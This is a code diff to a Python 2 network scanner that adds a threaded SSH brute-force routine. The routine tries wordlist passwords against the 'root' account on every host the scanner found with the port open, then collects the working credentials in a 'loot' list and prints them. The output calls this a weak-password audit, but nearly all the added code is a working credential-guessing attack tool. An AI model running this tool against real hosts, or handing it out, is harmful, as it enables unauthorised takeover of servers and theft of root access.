@@ -18,7 +18,9 @@ import sys
 import socket
 from IPy import IP
 from datetime import datetime
-
+import paramiko
+import time
+import threading
 
 #kinda global variables
 
@@ -26,6 +28,9 @@ check_vulns='no'
 remote_address=''
 remote_service=''
 target_host_list=[]
+loot_list=[]
+filename='./wordlist'
+
 
 # define some colors in a class just to be flushy
 
@@ -98,23 +103,40 @@ def network_scanner():
                 	banner=connection_socket.recv(1024)
                 	connection_socket.close()
                 	if connection_socket:
-                        	print success + " Port "+str(remote_service) +" is open on " + str(ip) +color.PURPLE +" Running :----> " +color.RED+banner
+                		print success + " Port "+str(remote_service) +" is open on " + str(ip) +color.PURPLE +" Running :----> " +color.RED+banner
 				target_host_list.append(str(ip))
 				print success + color.PURPLE +"\'"+ str(ip) + "\' Added to the DB"
         	except:
                 	pass
-
-	stop_time=datetime.now()
-	time_taken=stop_time - start_time
+		stop_time=datetime.now()
+		time_taken=stop_time - start_time
 	if len(target_host_list)==0:
 		print fail + "No hosts were found with open port " +remote_service
 	else:
 		print success + str(len(target_host_list))+ " Total hosts added to the DB ready for auditing.."
-	print color.BLUE +"\n Scanning finished in "+ str(time_taken)
-
-
+	print color.BLUE+"\n Scanning finished in "+ str(time_taken) +"\n"
+	
+#END of network_scanner()
 
 #start of ssh_brute()
+
+def ssh_brute(IP_address,Password):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(IP_address, username='root', password=Password)
+    except paramiko.AuthenticationException:
+	pass
+    else:
+        print success+"Password found for " +color.PURPLE+"'root@"+ IP_address +"'"
+	#add this host to loot DB
+	db_entry= "Host:"+ IP_address +"--->Username:'root'---->Password:" + Password
+	loot_list.append(db_entry)
+    ssh.close()
+
+#END of ssh_brute()
+
+
 
 
 
@@ -217,4 +239,37 @@ if check_vulns == 'no' :
 print "\n"
 #END of validations
 #call the scanner
-network_scanner()
+network_scanner()	
+		
+'''
+#with the network scan done we now have a list with all potential targets for bruteforce
+#if the service selected is SSH then we do an SSH brute force else we do telnet an shellshock check
+'''
+if int(remote_service) == 22 :
+	print "[+] Brute forcing below hosts for weak 'root' passwords...."
+	print info +"Please be patient...\n"
+	print color.RED+"-" * 48
+	for every_target_host in target_host_list :
+		print color.BLUE + every_target_host
+	print color.RED+ "." * 48
+	#load and open the wordlist start bruteforcing
+	fd = open(filename, "r")
+	for line in fd.readlines():
+		for host in target_host_list :
+    			password = line.strip()
+    			t = threading.Thread(target=ssh_brute, args=(host,password))
+    			t.start()
+    			time.sleep(0.3)
+   
+	fd.close()
+
+
+if len(loot_list)== 0:
+	print fail +"No weak passwords found! The networks seems a bit secure\n"
+else :
+	print "\n[Below hosts have weak SSH passwords change them.]"
+	print color.BLUE +"-" * 48
+	for every_exploited_host in loot_list :
+		print color.GREEN+every_exploited_host
+
+	print color.BLUE+ "-" * 48
